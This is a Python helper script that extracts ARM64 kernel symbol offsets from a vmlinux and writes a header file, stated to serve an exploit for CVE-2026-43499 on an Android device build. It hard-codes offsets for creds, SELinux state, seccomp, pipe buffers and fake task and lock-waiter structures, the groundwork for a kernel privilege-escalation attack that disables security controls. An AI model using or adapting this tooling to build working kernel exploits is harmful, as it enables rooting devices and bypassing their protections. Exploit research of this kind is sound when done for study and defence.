#!/usr/bin/env python3
"""
Extract kernel offsets from vmlinux for CVE-2026-43499 exploit.

Usage:
    python3 extract_kernel_offsets.py <vmlinux_path> [output_file]
    
Example:
    python3 extract_kernel_offsets.py kernel_src/out/vmlinux offsets.h
"""

import subprocess
import sys
import os
from pathlib import Path

# Default kernel base address for ARM64
KIMAGE_TEXT_BASE = 0xffffffc080000000

# Symbols needed for CVE-2026-43499 exploit
REQUIRED_SYMBOLS = [
    'init_task',
    'selinux_enforcing',
    'security_hook_heads',
    'kmalloc_caches',
    'root_task_group',
    'selinux_blob_sizes',
    'anon_pipe_buf_ops',
    'nfulnl_logger',
    'loggers',
    'random_boot_id',
    'sysctl_bootid',
    'ashmem',
    'configfs',
    'copy_splice_read',
    'noop_llseek',
]

# Static offsets that don't change between versions
STATIC_OFFSETS = {
    'LOCK_OFF': 0x1350,
    'W0_OFF': 0x2220,
    'FOPS_OFF': 0x1000,
    'SCRATCH_OFF': 0x3000,
    'RIGHT_OFF': 0x4440,
    'LEFT_OFF': 0x5550,
    'FAKE_TASK_OFF': 0x3200,
    'WAITER_LOCAL_OFF': 0x80,
    'WAITER_TREE_ENTRY_OFF': 0x00,
    'WAITER_PI_TREE_ENTRY_OFF': 0x18,
    'WAITER_TASK_OFF': 0x30,
    'WAITER_LOCK_OFF': 0x38,
    'WAITER_WAKE_STATE_OFF': 0x40,
    'WAITER_PRIO_OFF': 0x44,
    'WAITER_DEADLINE_OFF': 0x48,
    'WAITER_WW_CTX_OFF': 0x50,
    'FAKE_WAITER_TREE_PRIO_OFF': 0x18,
    'FAKE_WAITER_TREE_DEADLINE_OFF': 0x20,
    'FAKE_WAITER_PI_TREE_ENTRY_OFF': 0x28,
    'FAKE_WAITER_PI_TREE_PRIO_OFF': 0x40,
    'FAKE_WAITER_PI_TREE_DEADLINE_OFF': 0x48,
    'FAKE_WAITER_TASK_OFF': 0x50,
    'FAKE_WAITER_LOCK_OFF': 0x58,
    'FAKE_WAITER_WAKE_STATE_OFF': 0x60,
    'FAKE_WAITER_WW_CTX_OFF': 0x68,
    'FAKE_TASK_USAGE_OFF': 0x40,
    'FAKE_TASK_PRIO_OFF': 0x84,
    'FAKE_TASK_NORMAL_PRIO_OFF': 0x8c,
    'FAKE_TASK_TASK_GROUP_OFF': 0x348,
    'FAKE_TASK_PI_LOCK_OFF': 0x90c,
    'FAKE_TASK_PI_WAITERS_OFF': 0x920,
    'FAKE_TASK_PI_TOP_TASK_OFF': 0x930,
    'FAKE_TASK_PI_BLOCKED_ON_OFF': 0x938,
    'CFG_PAGE_OFF': 16,
    'CFG_NEEDS_READ_FILL_OFF': 80,
    'CFG_BIN_BUFFER_OFF': 88,
    'CFG_BIN_BUFFER_SIZE_OFF': 96,
    'CFG_CB_MAX_SIZE_OFF': 100,
    'MM_OWNER_OFF': 1032,
    'TASK_PID_OFF': 0x618,
    'TASK_TGID_OFF': 0x61c,
    'TASK_REAL_PARENT_OFF': 0x628,
    'TASK_ATOMIC_FLAGS_OFF': 0x5d8,
    'TASK_REAL_CRED_OFF': 0x818,
    'TASK_CRED_OFF': 0x820,
    'TASK_COMM_OFF': 0x830,
    'TASK_TASKS_OFF': 0x550,
    'TASK_THREAD_INFO_FLAGS_OFF': 0x00,
    'TASK_SECCOMP_OFF': 0x8e8,
    'CRED_UID_OFF': 8,
    'CRED_SECUREBITS_OFF': 40,
    'CRED_CAPS_OFF': 48,
    'CRED_SECURITY_OFF': 128,
    'SELINUX_CRED_BLOB_OFF': 0,
    'SELINUX_CRED_OSID_OFF': 0,
    'SELINUX_CRED_SID_OFF': 4,
    'SECCOMP_MODE_OFF': 0x00,
    'SECCOMP_FILTER_COUNT_OFF': 0x04,
    'SECCOMP_FILTER_OFF': 0x08,
    'TIF_SECCOMP_BIT': 11,
    'PFA_NO_NEW_PRIVS_BIT': 0,
    'STRUCT_PAGE_SIZE': 0x40,
    'STRUCT_PAGE_COMPOUND_HEAD_OFF': 0x08,
    'STRUCT_SLAB_CACHE_OFF': 0x08,
    'STRUCT_PAGE_TYPE_OFF': 0x30,
    'PIPE_BUFFER_SIZE': 0x28,
    'PIPE_BUFFER_SLOTS': 32,
    'PIPE_BUF_FLAG_CAN_MERGE': 0x10,
    'FOPS_OWNER_OFF': 0x00,
    'FOPS_LLSEEK_OFF': 0x08,
    'FOPS_READ_OFF': 0x10,
    'FOPS_WRITE_OFF': 0x18,
    'FOPS_READ_ITER_OFF': 0x20,
    'FOPS_WRITE_ITER_OFF': 0x28,
    'FOPS_IOCTL_OFF': 0x48,
    'FOPS_COMPAT_IOCTL_OFF': 0x50,
    'FOPS_MMAP_OFF': 0x58,
    'FOPS_OPEN_OFF': 0x68,
    'FOPS_RELEASE_OFF': 0x78,
    'FOPS_SPLICE_READ_OFF': 0xb8,
    'FOPS_SHOW_FDINFO_OFF': 0xd8,
}


def extract_offsets_from_vmlinux(vmlinux_path):
    """Extract kernel offsets from vmlinux using nm."""
    print(f"[*] Extracting offsets from: {vmlinux_path}")
    
    if not os.path.exists(vmlinux_path):
        print(f"[-] Error: vmlinux not found at {vmlinux_path}")
        sys.exit(1)
    
    # Run nm to get symbols
    try:
        result = subprocess.run(
            ['nm', '-S', vmlinux_path],
            capture_output=True,
            text=True,
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running nm: {e}")
        sys.exit(1)
    except FileNotFoundError:
        print("[-] Error: 'nm' command not found. Install binutils.")
        sys.exit(1)
    
    # Parse symbols and calculate offsets
    symbols_dict = {}
    
    for line in result.stdout.split('\n'):
        if not line.strip():
            continue
        
        parts = line.split()
        if len(parts) < 3:
            continue
        
        try:
            addr_str = parts[0]
            symbol = parts[-1]
            
            # Skip unknown addresses
            if addr_str == '0000000000000000':
                continue
            
            addr = int(addr_str, 16)
            offset = addr - KIMAGE_TEXT_BASE
            
            # Only store valid offsets
            if offset > 0:
                symbols_dict[symbol] = offset
        except (ValueError, IndexError):
            continue
    
    if not symbols_dict:
        print("[-] Error: No symbols extracted from vmlinux")
        sys.exit(1)
    
    print(f"[+] Found {len(symbols_dict)} symbols")
    
    # Filter for required symbols
    found_offsets = {}
    
    for symbol, offset in symbols_dict.items():
        for required in REQUIRED_SYMBOLS:
            if required.lower() in symbol.lower():
                found_offsets[symbol] = offset
                break
    
    print(f"[+] Matched {len(found_offsets)} required symbols")
    
    return found_offsets


def generate_target_h(found_offsets, build_variant="bluejay", build_fingerprint="google/bluejay/bluejay:14/BP2A.250705.008/...:user/release-keys"):
    """Generate target.h header file from offsets."""
    
    output = []
    output.append("#ifndef OFFSET_H")
    output.append("#define OFFSET_H")
    output.append("")
    output.append(f'#define BUILD_VARIANT_LABEL "{build_variant}"')
    output.append(f'#define BUILD_FINGERPRINT "{build_fingerprint}"')
    output.append("")
    output.append("#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL")
    output.append("#define P0_PAGE_OFFSET 0xffffff8000000000ULL")
    output.append("#define P0_PHYS_OFFSET 0x80000000ULL")
    output.append("#define P0_KERNEL_PHYS_LOAD 0x80000000ULL")
    output.append("#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL")
    output.append("#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL")
    output.append("#define DIRECT_MAP_BASE 0xffffff8000000000ULL")
    output.append("#define DIRECT_MAP_END 0xffffff9000000000ULL")
    output.append("#define VMEMMAP_START 0xfffffffe00000000ULL")
    output.append("")
    
    # Add extracted offsets
    for symbol, offset in sorted(found_offsets.items(), key=lambda x: x[1]):
        define_name = symbol.upper() + '_OFF'
        output.append(f"#define {define_name:45s} 0x{offset:010x}ULL")
    
    output.append("")
    
    # Add address macros
    for symbol in sorted(found_offsets.keys()):
        define_name = symbol.upper()
        offset_name = symbol.upper() + '_OFF'
        output.append(f"#define {define_name:45s} (KIMAGE_TEXT_BASE + {offset_name})")
    
    # Add static offsets
    output.append("")
    output.append("/* Static offsets (constant across versions) */")
    output.append("")
    
    for define_name, value in sorted(STATIC_OFFSETS.items()):
        if isinstance(value, int):
            output.append(f"#define {define_name:45s} 0x{value:04x}")
        else:
            output.append(f"#define {define_name:45s} {value}")
    
    output.append("")
    output.append("#endif")
    
    return "\n".join(output)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    
    vmlinux_path = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "target.h"
    
    # Extract offsets
    found_offsets = extract_offsets_from_vmlinux(vmlinux_path)
    
    # Generate header
    target_h = generate_target_h(found_offsets)
    
    # Print to stdout
    print("\n[*] Generated offsets:")
    print(target_h)
    
    # Save to file
    with open(output_file, 'w') as f:
        f.write(target_h)
    
    print(f"\n[+] Offsets saved to: {output_file}")
    print(f"[+] Total offsets extracted: {len(found_offsets)}")
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
